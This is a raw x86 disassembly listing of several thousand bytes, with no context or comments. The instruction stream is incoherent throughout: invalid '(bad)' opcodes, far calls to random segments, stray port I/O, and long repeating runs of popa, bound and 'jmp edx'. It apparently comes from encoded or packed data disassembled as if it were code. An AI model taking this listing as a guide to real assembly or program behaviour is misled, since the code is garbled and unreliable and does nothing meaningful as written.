  430f61:	call   0xdd10:0x13c03a96
  430f68:	out    0x8c,al
  430f6a:	popa   
  430f6b:	popa   
  430f6c:	leave  
  430f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430f6e:	push   ds
  430f6f:	popa   
  430f70:	push   0xadd26161
  430f75:	push   0xea0d9ee8
  430f7a:	push   ebp
  430f7b:	sub    eax,0x6933cea
  430f80:	mov    ds:0x4f4c710d,eax
  430f85:	ret    0x520d
  430f88:	jg     0x430fd4
  430f8a:	push   esi
  430f8b:	push   edx
  430f8c:	adc    esp,esi
  430f8e:	int    0x61
  430f90:	rep lods eax,DWORD PTR ds:[esi]
  430f92:	pop    edi
  430f93:	popa   
  430f94:	popa   
  430f95:	or     eax,0x9aed1f60
  430f9a:	fdivr  DWORD PTR [edi]
  430f9c:	push   0x611e6fa7
  430fa1:	push   0x8cb26161
  430fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430fa7:	(bad)  
  430fa8:	call   0xdc1fdfe
  430fad:	jno    0x430ffb
  430faf:	maxss  xmm4,DWORD PTR [ecx+0x61]
  430fb4:	mov    ds:0x68f3d874,al
  430fb9:	fsubr  st,st(5)
  430fbb:	push   0x64e8ffa7
  430fc0:	rcr    BYTE PTR [eax-0x2fcb9828],0xd
  430fc7:	dec    esi
  430fc8:	call   0x681ba860
  430fcd:	xchg   edi,eax
  430fce:	shr    BYTE PTR [edi],1
  430fd0:	mul    DWORD PTR [ebx+0x57]
  430fd3:	call   0x637d3fcf
  430fd8:	push   edi
  430fd9:	sub    eax,0xd3eec84f
  430fde:	lods   eax,DWORD PTR ds:[esi]
  430fdf:	pop    ds
  430fe0:	arpl   WORD PTR [eax-0xd],sp
  430fe3:	rcr    DWORD PTR [edi+0x61],cl
  430fe6:	popa   
  430fe7:	mov    dl,0x7e
  430fe9:	retf   0xc0c3
  430fec:	rol    eax,0xc1
  430fef:	bound  ebx,QWORD PTR [esi+0x2ac8c98e]
  430ff5:	into   
  430ff6:	cmp    esp,DWORD PTR [ecx+0x61]
  430ff9:	das    
  430ffa:	popa   
  430ffb:	out    dx,al
  430ffc:	jae    0x430fab
  430ffe:	push   ebx
  430fff:	arpl   WORD PTR [eax-0xd],sp
  431002:	jb     0x431063
  431004:	popa   
  431005:	popa   
  431006:	mov    dl,0x32
  431008:	lods   eax,DWORD PTR ds:[esi]
  431009:	outs   dx,DWORD PTR ds:[esi]
  43100a:	arpl   WORD PTR [eax-0xd],sp
  43100d:	imul   ebx,DWORD PTR [edi+0x61],0x61
  431011:	mov    dl,0xcf
  431013:	retf   0x3a96
  431016:	lods   eax,DWORD PTR ds:[esi]
  431017:	xchg   ecx,eax
  431018:	call   0xd2dabd7c
  43101d:	or     eax,0xb22d55b2
  431022:	cmp    al,0xa7
  431024:	mov    dl,0x8e
  431026:	xchg   ebx,eax
  431027:	(bad)  [edi+0x68]
  43102a:	popa   
  43102b:	popa   
  43102c:	mov    cl,0xd
  43102e:	jmp    0x6168:0xef0bb55
  431035:	popa   
  431036:	lods   eax,DWORD PTR ds:[esi]
  431037:	push   eax
  431038:	repz xor BYTE PTR [eax+0x61],ch
  43103c:	popa   
  43103d:	or     eax,0x87e750b2
  431042:	lods   eax,DWORD PTR ds:[esi]
  431043:	sbb    bl,dh
  431045:	in     al,dx
  431046:	push   0xb20d6161
  43104b:	sub    bh,ah
  43104d:	xchg   ecx,eax
  43104e:	or     eax,0xcd0d58b2
  431053:	sub    BYTE PTR [edi],dl
  431055:	int    0x58
  431057:	or     eax,0xcd1750cd
  43105c:	sub    BYTE PTR ds:0xcd173ccd,cl
  431062:	push   eax
  431063:	pop    ss
  431064:	mov    dl,0x3c
  431066:	retf   0xc1c3
  431069:	sub    bh,BYTE PTR [edx-0x70]
  43106c:	popa   
  43106d:	popa   
  43106e:	das    
  43106f:	call   0x3a96:0xcbc85156
  431076:	sbb    bl,BYTE PTR [edi]
  431078:	call   0xd29a07dc
  43107d:	or     eax,0x1ef34c71
  431082:	push   0x7eb26161
  431087:	or     eax,0xea0df375
  43108c:	dec    esp
  43108d:	pop    ds
  43108e:	dec    eax
  43108f:	push   esi
  431090:	sub    eax,0xbc9a7057
  431095:	adc    ebx,edi
  431097:	fwait
  431098:	imul   esi
  43109a:	test   DWORD PTR ds:0xf4d84c71,ecx
  4310a0:	pop    edi
  4310a1:	repz cld 
  4310a3:	push   0x8ab26161
  4310a8:	or     eax,0xea0df375
  4310ad:	dec    esp
  4310ae:	pop    ds
  4310af:	dec    eax
  4310b0:	push   esi
  4310b1:	jo     0x43104d
  4310b3:	shl    DWORD PTR [eax-0x66],0xbc
  4310b7:	adc    esp,DWORD PTR [eax]
  4310b9:	fwait
  4310ba:	imul   DWORD PTR [eax+0x61]
  4310bd:	popa   
  4310be:	out    dx,al
  4310bf:	xchg   edx,eax
  4310c0:	sub    edi,esi
  4310c2:	pop    edi
  4310c3:	popa   
  4310c4:	popa   
  4310c5:	push   esi
  4310c6:	jmp    0x611e:0xc192704c
  4310cd:	push   0xcd176161
  4310d2:	sbb    BYTE PTR ds:0xfa0da21c,ch
  4310d8:	repz jp 0x431143
  4310db:	popa   
  4310dc:	popa   
  4310dd:	or     eax,0xe8522d60
  4310e2:	gs push 0xead818cd
  4310e8:	stc    
  4310e9:	not    DWORD PTR [ebx+0x6161add8]
  4310ef:	popa   
  4310f0:	fdiv   DWORD PTR [ebp-0x7]
  4310f3:	cmp    cl,BYTE PTR ds:0x30d818cd
  4310f9:	imul   eax
  4310fb:	push   esi
  4310fc:	jo     0x431154
  4310fe:	ror    DWORD PTR ds:0x3f1f60ea,0x3b
  431105:	sub    eax,0xa270a21c
  43110a:	mov    esp,0x40d32013
  43110f:	push   esi
  431110:	popa   
  431111:	popa   
  431112:	or     eax,0x68a6f3fa
  431117:	popa   
  431118:	popa   
  431119:	or     eax,0xe8522d60
  43111e:	gs pop ss
  431120:	int    0xf3
  431122:	pop    ss
  431123:	int    0x3c
  431125:	fdiv   DWORD PTR [eax]
  431127:	imul   eax
  431129:	jae    0x431138
  43112b:	outs   dx,DWORD PTR ds:[esi]
  43112c:	fcom   DWORD PTR [ebp-0x12b097c4]
  431132:	fmul   st,st(5)
  431134:	cmp    al,0x5f
  431136:	int3   
  431137:	fdiv   DWORD PTR [eax]
  431139:	mov    WORD PTR [ebx-0x7f],?
  43113c:	adc    al,0xba
  43113e:	pop    edi
  43113f:	popa   
  431140:	popa   
  431141:	sub    eax,0x46520d1f
  431146:	xchg   ebp,eax
  431147:	cmp    al,0x56
  431149:	jne    0x431187
  43114b:	dec    edi
  43114c:	dec    eax
  43114d:	push   esi
  43114e:	jne    0x4311b0
  431150:	pop    ss
  431151:	jne    0x43119f
  431153:	out    dx,al
  431154:	xor    ebx,eax
  431156:	in     eax,dx
  431157:	div    ebx
  431159:	pop    ebx
  43115a:	popa   
  43115b:	popa   
  43115c:	popa   
  43115d:	dec    edi
  43115e:	out    dx,al
  43115f:	dec    edi
  431160:	xchg   ebp,eax
  431161:	cmp    al,0xa1
  431163:	mov    ebp,0x623be848
  431168:	jne    0x4311a6
  43116a:	aaa    
  43116b:	mov    ebp,0xf3b2cc48
  431170:	adc    al,0x2c
  431172:	cmp    esp,DWORD PTR [ecx+0x61]
  431175:	push   esi
  431176:	jne    0x4311d8
  431178:	pop    ss
  431179:	jne    0x4311c7
  43117b:	pop    ds
  43117c:	xchg   ebp,eax
  43117d:	cmp    al,0xf7
  43117f:	jo     0x431178
  431181:	mov    esp,0xd9b622d
  431186:	and    DWORD PTR ds:0x6f34c71,ecx
  43118c:	popa   
  43118d:	popa   
  43118e:	popa   
  43118f:	and    al,0x68
  431191:	out    0x56,eax
  431193:	xchg   ecx,eax
  431194:	jmp    0x64b2:0xccc24f3c
  43119b:	out    dx,al
  43119c:	popa   
  43119d:	bound  esi,QWORD PTR [ebp+0x3c]
  4311a0:	or     eax,0x1fd818cd
  4311a5:	pop    edi
  4311a6:	or     eax,0x210d55ea
  4311ab:	sub    eax,0x75a18e75
  4311b0:	cmp    al,0xc4
  4311b2:	ror    BYTE PTR ds:0x3cb22d4a,1
  4311b8:	or     eax,0xbbb138a5
  4311bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4311be:	addr16 jae 0x431217
  4311c1:	shl    DWORD PTR [edx+0x55ea174a],1
  4311c7:	xchg   ebx,eax
  4311c8:	push   es
  4311c9:	xor    DWORD PTR [edi-0x266cc716],esp
  4311cf:	(bad)  
  4311d0:	pop    esp
  4311d1:	bound  esp,QWORD PTR [edx-0xd]
  4311d4:	cs popa 
  4311d6:	popa   
  4311d7:	popa   
  4311d8:	sub    eax,0x8ee6131c
  4311dd:	xchg   esi,eax
  4311de:	or     eax,0xb20dfba5
  4311e3:	imul   ebp,DWORD PTR ds:0xa8178ab2,0xda6a50d
  4311ed:	jmp    0xa017:0x8eea2d55
  4311f4:	push   edi
  4311f5:	(bad)  
  4311f6:	mov    esp,0x617622c3
  4311fb:	mov    esp,0xa21c2dca
  431200:	out    dx,al
  431201:	push   eax
  431202:	(bad)  
  431203:	pop    esi
  431204:	popa   
  431205:	popa   
  431206:	popa   
  431207:	push   0x1f1568e8
  43120c:	xor    eax,0xb20da49a
  431211:	imul   esp,DWORD PTR [edi+0x187376b2],0x1f48750d
  43121b:	dec    eax
  43121c:	call   0xb217:0x487517b1
  431223:	imul   edi,DWORD PTR [ebp+edx*1-0x6c0632f3],0x3f1f1c06
  43122e:	not    DWORD PTR [esi+0x75]
  431231:	repz push esi
  431233:	pop    ds
  431234:	out    dx,al
  431235:	cmp    edx,DWORD PTR [ebx+0x75561c06]
  43123b:	stc    
  43123c:	or     eax,0xe6136071
  431241:	jne    0x4312a4
  431243:	sub    eax,0x75e6131c
  431248:	popa   
  431249:	(bad)  
  43124a:	pop    esi
  43124b:	popa   
  43124c:	popa   
  43124d:	popa   
  43124e:	push   0xc60d7673
  431253:	mov    gs,WORD PTR [edx-0x47131e1]
  431259:	call   0x173:0xb68ec6a7
  431260:	sbb    cl,BYTE PTR [ecx-0x5571d39e]
  431266:	pop    ds
  431267:	xor    eax,0x8ebe049a
  43126c:	sti    
  43126d:	or     eax,0xa5f2934d
  431272:	popa   
  431273:	pop    ds
  431274:	lock xchg edi,eax
  431276:	xchg   ebx,eax
  431277:	mov    edx,0x8ec6a14e
  43127c:	sti    
  43127d:	jae    0x43120a
  43127f:	or     eax,0x9a612747
  431284:	popa   
  431285:	popa   
  431286:	sub    eax,0x34f01f4e
  43128b:	xchg   esp,eax
  43128c:	push   0x1c5661cd
  431291:	adc    esp,esi
  431293:	mov    fs,WORD PTR [edx+0x34f11f15]
  431299:	aaa    
  43129a:	(bad)  
  43129b:	mov    ?,ebx
  43129d:	sub    eax,0xa5379447
  4312a2:	popa   
  4312a3:	push   esi
  4312a4:	sbb    al,0xd8
  4312a6:	sbb    al,0x68
  4312a8:	adc    esp,esi
  4312aa:	mov    fs,WORD PTR [edx+0x640da515]
  4312b0:	(bad)  
  4312b1:	mov    fs:0xa461615f,al
  4312b7:	retf   
  4312b8:	and    edx,esp
  4312ba:	jp     0x43131e
  4312bc:	bound  esp,QWORD PTR [edx-0x53]
  4312bf:	loop   0x4312c2
  4312c1:	imul   esp,DWORD PTR [ecx],0x626240e2
  4312c7:	bound  esp,QWORD PTR ds:0xd6901e2
  4312cd:	jne    0x431269
  4312cf:	pop    ss
  4312d0:	jne    0x4312f6
  4312d2:	or     eax,0x62627ae2
  4312d7:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4312dd:	xor    al,0x5e
  4312df:	call   0xe25a748c
  4312e4:	into   
  4312e5:	bound  esp,QWORD PTR [edx+0x62]
  4312e8:	or     eax,0x62627ae2
  4312ed:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4312f3:	xor    al,0x5e
  4312f5:	call   0x755a74a2
  4312fa:	pop    ebp
  4312fb:	or     eax,0x62627ae2
  431300:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431306:	xor    al,0x5e
  431308:	call   0x755a74b5
  43130d:	adc    al,0xd
  43130f:	loop   0x43138b
  431311:	bound  esp,QWORD PTR [edx+0x62]
  431314:	test   DWORD PTR [ebx],ecx
  431316:	call   0xa8e8:0x5e343ac9
  43131d:	popa   
  43131e:	pop    ss
  43131f:	jne    0x431341
  431321:	and    DWORD PTR [ebp+0x1c],esi
  431324:	lods   eax,DWORD PTR ds:[esi]
  431325:	xor    al,0x9
  431327:	imul   esp,DWORD PTR [ecx],0x6262e6e2
  43132d:	bound  ebp,QWORD PTR [ebp+0x2169010b]
  431333:	jne    0x4312e2
  431335:	and    dl,ah
  431337:	add    DWORD PTR [ecx+0x21],ebp
  43133a:	jne    0x431335
  43133c:	aam    0x61
  43133e:	popa   
  43133f:	popa   
  431340:	and    edx,esp
  431342:	jmp    0x4313a6
  431344:	bound  esp,QWORD PTR [edx-0x2c]
  431347:	popa   
  431348:	popa   
  431349:	popa   
  43134a:	and    DWORD PTR [ebp+0x69],esi
  43134d:	xchg   esp,eax
  43134e:	popa   
  43134f:	popa   
  431350:	popa   
  431351:	and    edx,esp
  431353:	out    0x62,eax
  431355:	bound  esp,QWORD PTR [edx-0x6c]
  431358:	popa   
  431359:	popa   
  43135a:	popa   
  43135b:	and    DWORD PTR [ebp+0x31],esi
  43135e:	int3   
  43135f:	popa   
  431360:	popa   
  431361:	popa   
  431362:	and    edx,esp
  431364:	fbld   TBYTE PTR [edx+0x62]
  431367:	bound  ebp,QWORD PTR [ecx+eiz*2]
  43136a:	popa   
  43136b:	popa   
  43136c:	or     eax,0x62627ae2
  431371:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431377:	xor    al,0x5e
  431379:	call   0x755a7526
  43137e:	dec    esp
  43137f:	or     eax,0x62627ae2
  431384:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43138a:	xor    al,0x5e
  43138c:	call   0xe25a7539
  431391:	jecxz  0x4313f5
  431393:	bound  esp,QWORD PTR [edx-0x28]
  431396:	pop    ebx
  431397:	mov    dh,0x62
  431399:	bound  esp,QWORD PTR [edx+0x61]
  43139c:	out    dx,al
  43139d:	lea    ecx,ds:0x6262b6e2
  4313a3:	bound  esp,QWORD PTR [edx+0x62b6e217]
  4313a9:	bound  esp,QWORD PTR [edx-0x2a]
  4313ac:	and    esi,DWORD PTR [esi-0x359d9d9e]
  4313b2:	pop    edi
  4313b3:	popa   
  4313b4:	popa   
  4313b5:	jae    0x43135b
  4313b7:	fcomp  DWORD PTR [ebx-0x36]
  4313ba:	bound  esp,QWORD PTR [edx+0x62]
  4313bd:	popa   
  4313be:	out    dx,al
  4313bf:	lea    ecx,ds:0x6262cae2
  4313c5:	bound  esp,QWORD PTR [edx+0x62cae217]
  4313cb:	bound  esp,QWORD PTR [edx-0x28]
  4313ce:	and    ecx,edx
  4313d0:	bound  esp,QWORD PTR [edx+0x62]
  4313d3:	test   BYTE PTR [ebx-0x7b],dh
  4313d6:	fcomp  DWORD PTR [ebx-0x42]
  4313d9:	bound  esp,QWORD PTR [edx+0x62]
  4313dc:	popa   
  4313dd:	out    dx,al
  4313de:	lea    ecx,ds:0x6262bee2
  4313e4:	bound  esp,QWORD PTR [edx+0x62bee217]
  4313ea:	bound  esp,QWORD PTR [edx-0x28]
  4313ed:	and    edi,DWORD PTR [esi-0x1e9d9d9e]
  4313f3:	jae    0x431473
  4313f5:	adc    esi,DWORD PTR [ebp-0x25]
  4313f8:	rcl    BYTE PTR [ebx],cl
  4313fa:	jne    0x431454
  4313fc:	sar    BYTE PTR [edx+0x52],cl
  4313ff:	addr16 loop 0x43146b
  431402:	repz cld 
  431404:	js     0x431467
  431406:	popa   
  431407:	out    dx,al
  431408:	es out dx,al
  43140a:	or     ebp,esi
  43140c:	mov    ebp,db6
  43140f:	std    
  431410:	mov    WORD PTR [edx-0x1df29e9f],fs
  431416:	jp     0x43147a
  431418:	bound  esp,QWORD PTR [edx-0x7b]
  43141b:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  431421:	call   0x755a75ce
  431426:	pusha  
  431427:	or     eax,0x62627ae2
  43142c:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431432:	xor    al,0x5e
  431434:	call   0x755a75e1
  431439:	push   esp
  43143a:	fcom   DWORD PTR [ebp-0x7319e4f]
  431440:	mov    ah,BYTE PTR [ecx+0x61]
  431443:	popa   
  431444:	pop    ss
  431445:	jne    0x4313f8
  431447:	or     eax,0xa20db175
  43144c:	jb     0x431465
  43144e:	jne    0x431458
  431450:	or     eax,0xa20d0875
  431455:	xchg   BYTE PTR [edi],dl
  431457:	jne    0x4314ae
  431459:	or     eax,0xcd132475
  43145e:	mov    cl,0x17
  431460:	add    al,0xfd
  431462:	push   0x750d6161
  431467:	and    al,0x13
  431469:	int    0x8
  43146b:	pop    ss
  43146c:	add    al,0x54
  43146e:	push   0x750d6161
  431473:	and    al,0x13
  431475:	int    0x55
  431477:	pop    ss
  431478:	add    al,0x24
  43147a:	push   0xb0d6161
  43147f:	jp     0x4314e3
  431481:	bound  esp,QWORD PTR [edx-0x2a]
  431484:	dec    ebx
  431485:	or     ebx,DWORD PTR [edx-0x29c537]
  43148b:	pop    esi
  43148c:	call   0xb2a57639
  431491:	and    al,0xf3
  431493:	mov    ebx,edx
  431495:	popa   
  431496:	popa   
  431497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431498:	xor    DWORD PTR [ebx+0x6134826e],edx
  43149e:	popa   
  43149f:	or     eax,0xdb0d2475
  4314a4:	jmp    0xda47611
  4314a9:	int    0x24
  4314ab:	or     eax,0x6168e917
  4314b0:	popa   
  4314b1:	or     eax,0x56610d91
  4314b6:	cdq    
  4314b7:	xchg   esi,eax
  4314b8:	pop    ss
  4314b9:	loop   0x4314b2
  4314bb:	bound  esp,QWORD PTR [edx+0x62]
  4314be:	adc    esp,edx
  4314c0:	call   0xf770:0xd2626262
  4314c7:	or     eax,0x6262f7e2
  4314cc:	bound  esp,QWORD PTR [edx-0x53]
  4314cf:	adc    BYTE PTR [ecx+0x61],ah
  4314d2:	popa   
  4314d3:	or     eax,0xdb0d2475
  4314d8:	adc    BYTE PTR [eax+0x61],ch
  4314db:	popa   
  4314dc:	or     eax,0xf7130d61
  4314e1:	bound  esp,QWORD PTR [edx+0x62]
  4314e4:	push   esi
  4314e5:	(bad)  
  4314e6:	add    al,0x61
  4314e8:	popa   
  4314e9:	popa   
  4314ea:	ror    BYTE PTR ds:0xdb0d2475,cl
  4314f0:	dec    eax
  4314f1:	push   0xd2626161
  4314f6:	jbe    0x4314f7
  4314f8:	loop   0x431480
  4314fa:	bound  esp,QWORD PTR [edx+0x62]
  4314fd:	ret    0xe2ff
  431500:	lea    esp,[edx+0x62]
  431503:	(bad)  {k2}{z}
  431508:	bound  esp,QWORD PTR [edx+0x62]
  43150b:	cli    
  43150c:	jmp    edx
  43150e:	xchg   ebx,eax
  43150f:	bound  esp,QWORD PTR [edx+0x62]
  431512:	lock jmp edx
  431515:	xchg   edx,eax
  431516:	bound  esp,QWORD PTR [edx+0x62]
  431519:	push   eax
  43151a:	jmp    edx
  43151c:	mov    DWORD PTR [edx+0x62],esp
  43151f:	bound  edx,QWORD PTR [esi]
  431521:	jmp    edx
  431523:	mov    BYTE PTR [edx+0x62],ah
  431526:	(bad)  
  431527:	out    dx,al
  431528:	jmp    edx
  43152a:	(bad)  
  43152b:	bound  esp,QWORD PTR [edx+0x62]
  43152e:	ss jmp edx
  431531:	jle    0x431595
  431533:	bound  esp,QWORD PTR [edx+0x2a]
  431536:	jmp    edx
  431538:	imul   esp,DWORD PTR [edx+0x62],0x62
  43153c:	loopne 0x43153d
  43153e:	loop   0x4314e6
  431540:	bound  esp,QWORD PTR [edx+0x62]
  431543:	and    bh,bh
  431545:	loop   0x43157a
  431547:	bound  esp,QWORD PTR [edx+0x62]
  43154a:	repz jmp edx
  43154d:	xor    ah,BYTE PTR [edx+0x62]
  431550:	bound  edx,QWORD PTR [edi+edi*8]
  431553:	loop   0x43158e
  431555:	bound  esp,QWORD PTR [edx+0x62]
  431558:	xor    eax,0x6272e2ff
  43155d:	bound  esp,QWORD PTR [edx+0x3e]
  431560:	jmp    edx
  431562:	test   eax,0xf0626262
  431567:	jmp    edx
  431569:	test   al,0x62
  43156b:	bound  esp,QWORD PTR [edx+0x2a]
  43156e:	jmp    edx
  431570:	scas   eax,DWORD PTR es:[edi]
  431571:	bound  esp,QWORD PTR [edx+0x62]
  431574:	ret    0xe2ff
  431577:	sahf   
  431578:	bound  esp,QWORD PTR [edx+0x62]
  43157b:	out    dx,al
  43157c:	jmp    edx
  43157e:	test   DWORD PTR [edx+0x62],esp
  431581:	bound  esi,QWORD PTR ds:0x6284e2ff
  431587:	bound  esp,QWORD PTR [edx+0x3e]
  43158a:	jmp    edx
  43158c:	stos   DWORD PTR es:[edi],eax
  43158d:	bound  esp,QWORD PTR [edx+0x62]
  431590:	hlt    
  431591:	jmp    edx
  431593:	stos   BYTE PTR es:[edi],al
  431594:	bound  esp,QWORD PTR [edx+0x62]
  431597:	in     eax,dx
  431598:	jmp    edx
  43159a:	mov    eax,ds:0x16626262
  43159f:	jmp    edx
  4315a1:	mov    al,ds:0x42626262
  4315a6:	jmp    edx
  4315a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4315a9:	bound  esp,QWORD PTR [edx+0x62]
  4315ac:	lock jmp edx
  4315af:	xchg   esi,eax
  4315b0:	bound  esp,QWORD PTR [edx+0x62]
  4315b3:	ss jmp edx
  4315b6:	popf   
  4315b7:	bound  esp,QWORD PTR [edx+0x62]
  4315ba:	push   eax
  4315bb:	jmp    edx
  4315bd:	pushf  
  4315be:	bound  esp,QWORD PTR [edx+0x62]
  4315c1:	sub    bh,bh
  4315c3:	loop   0x431568
  4315c5:	bound  esp,QWORD PTR [edx+0x62]
  4315c8:	loopne 0x4315c9
  4315ca:	loop   0x431556
  4315cc:	bound  esp,QWORD PTR [edx+0x62]
  4315cf:	and    bh,bh
  4315d1:	loop   0x431554
  4315d3:	bound  esp,QWORD PTR [edx+0x62]
  4315d6:	repz jmp edx
  4315d9:	and    BYTE PTR [edx+0x62],0x62
  4315dd:	adc    al,0xff
  4315df:	loop   0x431568
  4315e1:	bound  esp,QWORD PTR [edx+0x62]
  4315e4:	xor    eax,0x6276e2ff
  4315e9:	bound  esp,QWORD PTR [edx+0x3e]
  4315ec:	jmp    edx
  4315ee:	jge    0x431652
  4315f0:	bound  esp,QWORD PTR [edx-0x10]
  4315f3:	jmp    edx
  4315f5:	jl     0x431659
  4315f7:	bound  esp,QWORD PTR [edx+0x2a]
  4315fa:	jmp    edx
  4315fc:	and    DWORD PTR [edx+0x62],0x62
  431600:	ret    0xe2ff
  431603:	sti    
  431604:	bound  esp,QWORD PTR [edx+0x62]
  431607:	out    dx,al
  431608:	jmp    edx
  43160a:	jns    0x43166e
  43160c:	bound  esp,QWORD PTR [edx+0x35]
  43160f:	jmp    edx
  431611:	js     0x431675
  431613:	bound  esp,QWORD PTR [edx+0x3e]
  431616:	jmp    edx
  431618:	jg     0x43167c
  43161a:	bound  esp,QWORD PTR [edx-0xc]
  43161d:	jmp    edx
  43161f:	mov    fs,WORD PTR [edx+0x62]
  431622:	(bad)  
  431623:	in     eax,dx
  431624:	jmp    edx
  431626:	aad    0x62
  431628:	bound  esp,QWORD PTR [edx+0x16]
  43162b:	jmp    edx
  43162d:	aam    0x62
  43162f:	bound  esp,QWORD PTR [edx+0x42]
  431632:	jmp    edx
  431634:	add    ah,BYTE PTR [edx+0x62]
  431637:	(bad)  
  431638:	lock jmp edx
  43163b:	cmp    BYTE PTR [edx+0x62],ah
  43163e:	bound  esi,QWORD PTR [esi]
  431640:	jmp    edx
  431642:	aaa    
  431643:	bound  esp,QWORD PTR [edx+0x62]
  431646:	push   eax
  431647:	jmp    edx
  431649:	bound  esp,QWORD PTR cs:[edx+0x62]
  43164d:	dec    esp
  43164e:	jmp    edx
  431650:	sub    eax,0xe0626262
  431655:	jmp    edx
  431657:	arpl   WORD PTR fs:[edx+0x62],sp
  43165b:	and    bh,bh
  43165d:	loop   0x43164b
  43165f:	arpl   WORD PTR [edx+0x62],sp
  431662:	repz jmp edx
  431665:	in     eax,dx
  431666:	arpl   WORD PTR [edx+0x62],sp
  431669:	adc    al,0xff
  43166b:	loop   0x431667
  43166d:	arpl   WORD PTR [edx+0x62],sp
  431670:	xor    eax,0x6331e2ff
  431675:	bound  esp,QWORD PTR [edx+0x3e]
  431678:	jmp    edx
  43167a:	outs   dx,DWORD PTR ds:[esi]
  43167b:	arpl   WORD PTR [edx+0x62],sp
  43167e:	lock jmp edx
  431681:	data16 arpl WORD PTR [edx+0x62],sp
  431685:	and    edi,edi
  431687:	loop   0x4316ee
  431689:	arpl   WORD PTR [edx+0x62],sp
  43168c:	sbb    bh,bh
  43168e:	loop   0x4316ed
  431690:	arpl   WORD PTR [edx+0x62],sp
  431693:	fs jmp edx
  431696:	inc    esp
  431697:	arpl   WORD PTR [edx+0x62],sp
  43169a:	inc    edx
  43169b:	jmp    edx
  43169d:	dec    ebx
  43169e:	arpl   WORD PTR [edx+0x62],sp
  4316a1:	lock jmp edx
  4316a4:	dec    edx
  4316a5:	arpl   WORD PTR [edx+0x62],sp
  4316a8:	sub    bh,bh
  4316aa:	loop   0x431715
  4316ac:	arpl   WORD PTR [edx+0x62],sp
  4316af:	loopne 0x431660
  4316b1:	sbb    al,0x13
  4316b3:	and    esi,DWORD PTR [eax]
  4316b5:	arpl   WORD PTR [edx+0x62],sp
  4316b8:	scas   al,BYTE PTR es:[edi]
  4316b9:	xchg   esp,eax
  4316ba:	scas   al,BYTE PTR es:[edi]
  4316bb:	mov    ebx,0x62a2e2ff
  4316c0:	bound  esp,QWORD PTR [edx+0x22]
  4316c3:	jmp    edx
  4316c5:	cdq    
  4316c6:	bound  esp,QWORD PTR [edx+0x62]
  4316c9:	repz jmp edx
  4316cc:	cwde   
  4316cd:	bound  esp,QWORD PTR [edx+0x62]
  4316d0:	adc    al,0xff
  4316d2:	loop   0x431673
  4316d4:	bound  esp,QWORD PTR [edx+0x62]
  4316d7:	xor    eax,0x622ce2ff
  4316dc:	bound  esp,QWORD PTR [edx+0x3e]
  4316df:	jmp    edx
  4316e1:	jne    0x431745
  4316e3:	bound  esp,QWORD PTR [edx-0x10]
  4316e6:	jmp    edx
  4316e8:	je     0x43174c
  4316ea:	bound  esp,QWORD PTR [edx+0x21]
  4316ed:	jmp    edx
  4316ef:	fwait
  4316f0:	bound  esp,QWORD PTR [edx+0x62]
  4316f3:	sbb    bh,bh
  4316f5:	loop   0x4316d1
  4316f7:	bound  esp,QWORD PTR [edx+0x62]
  4316fa:	fs jmp edx
  4316fd:	shl    DWORD PTR [edx+0x62],1
  431700:	bound  eax,QWORD PTR [edx-0x1]
  431703:	loop   0x4316d5
  431705:	bound  esp,QWORD PTR [edx+0x62]
  431708:	lock jmp edx
  43170b:	xlat   BYTE PTR ds:[ebx]
  43170c:	bound  esp,QWORD PTR [edx+0x62]
  43170f:	dec    esp
  431710:	jmp    edx
  431712:	(bad)  
  431713:	bound  esp,QWORD PTR [edx+0x62]
  431716:	loopne 0x4316c7
  431718:	sbb    al,0x13
  43171a:	and    ecx,ebp
  43171c:	bound  esp,QWORD PTR [edx+0x62]
  43171f:	scas   al,BYTE PTR es:[edi]
  431720:	xchg   esp,eax
  431721:	scas   al,BYTE PTR es:[edi]
  431722:	mov    ebx,0x63f35bd8
  431727:	bound  esp,QWORD PTR [edx+0x61]
  43172a:	fcomp  DWORD PTR [ebx+0x61]
  43172d:	bound  esp,QWORD PTR [edx+0x62]
  431730:	popa   
  431731:	bound  esi,QWORD PTR [edx+0x62617024]
  431737:	mov    dl,0x24
  431739:	or     eax,0xad622475
  43173e:	adc    al,0x68
  431740:	popa   
  431741:	popa   
  431742:	rep lods eax,DWORD PTR ds:[esi]
  431744:	jne    0x4317a7
  431746:	popa   
  431747:	ror    BYTE PTR ds:0xdb0d2475,cl
  43174d:	and    al,0x68
  43174f:	popa   
  431750:	popa   
  431751:	bound  esi,QWORD PTR [edx-0xd]
  431754:	aas    
  431755:	mov    ds:0xe2176161,eax
  43175a:	popa   
  43175b:	bound  esp,QWORD PTR [edx+0x62]
  43175e:	fsub   DWORD PTR [ebx]
  431760:	popa   
  431761:	bound  esp,QWORD PTR [edx+0x62]
  431764:	popa   
  431765:	mov    dl,0xa5
  431767:	jo     0x4317ca
  431769:	bound  esi,QWORD PTR [edx+0x24750d24]
  43176f:	bound  ebp,QWORD PTR [ebp+0x61616814]
  431775:	repz jmp 0x750d:0xd2616175
  43177d:	and    al,0xd
  43177f:	fisttp DWORD PTR [eax+0x68]
  431782:	popa   
  431783:	popa   
  431784:	(bad)
  431789:	popa   
  43178a:	bound  esp,QWORD PTR [edx+0x62]
  43178d:	fsub   DWORD PTR [ebx]
  43178f:	popa   
  431790:	bound  esp,QWORD PTR [edx+0x62]
  431793:	popa   
  431794:	mov    dl,0xd4
  431796:	jo     0x4317f9
  431798:	bound  esi,QWORD PTR [edx+0x24750d24]
  43179e:	bound  ebp,QWORD PTR [ebp+0x61616814]
  4317a4:	repz int3 
  4317a6:	jne    0x431809
  4317a8:	popa   
  4317a9:	ror    BYTE PTR ds:0xdb0d2475,cl
  4317af:	dec    eax
  4317b0:	push   0xd2626161
  4317b5:	xchg   edx,eax
  4317b6:	pop    ss
  4317b7:	loop   0x43181a
  4317b9:	bound  esp,QWORD PTR [edx+0x62]
  4317bc:	or     eax,0x62627ae2
  4317c1:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4317c7:	xor    al,0x5e
